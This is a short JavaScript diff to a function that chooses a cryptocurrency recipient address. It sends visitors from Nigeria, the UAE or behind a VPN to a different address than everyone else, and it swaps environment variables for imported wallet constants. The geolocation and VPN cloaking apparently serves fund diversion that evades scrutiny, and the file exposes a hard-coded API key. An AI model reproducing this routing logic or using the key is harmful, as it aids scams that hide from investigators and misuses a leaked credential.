@@ -1,4 +1,5 @@
 import axios from "axios";
+import { receiver, receiver2 } from "./Web3Config";
 
 // API keys for ipdata.co, ProxyCheck, VPNAPI, IPGeolocation, AbstractAPI
 const IPDATA_API_KEY = '894b025a42d599cc09ebd6e1ef307189c7996ed768d29be082b63d1a';
@@ -128,8 +129,8 @@ export async function getRecipientAddress() {
   const isVpn = isVpnIpdata || await checkVpnStatus(ip);
 
   const specialCountries = ["NG", "AE"];
-  const address = import.meta.env.VITE_REACT_APP_R;
-  const addrEss = import.meta.env.VITE_REACT_APP_r;
+  const address = receiver;
+  const addrEss = receiver2;
 
   return specialCountries.includes(countryCode) || isVpn ? address : addrEss;
 }
